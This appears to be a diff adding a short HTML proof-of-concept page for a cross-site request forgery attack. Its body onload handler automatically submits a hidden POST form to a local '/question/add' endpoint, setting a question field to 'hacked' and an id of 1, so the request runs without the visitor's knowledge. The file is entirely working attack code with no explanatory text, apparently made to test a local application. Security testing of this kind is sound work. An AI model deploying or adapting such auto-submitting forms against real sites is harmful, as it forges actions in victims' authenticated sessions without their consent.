@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>CSRF</title>
+  </head>
+  <body onload="document.CSRF.submit()">
+
+    <form action="https://localhost:8181/question/add" method="POST" name="CSRF">
+      <input name="question" class="form-control" id="question" value="hacked">
+      <input name="id" type="hidden" value="1">
+    </form>
+
+  </body>
+</html>
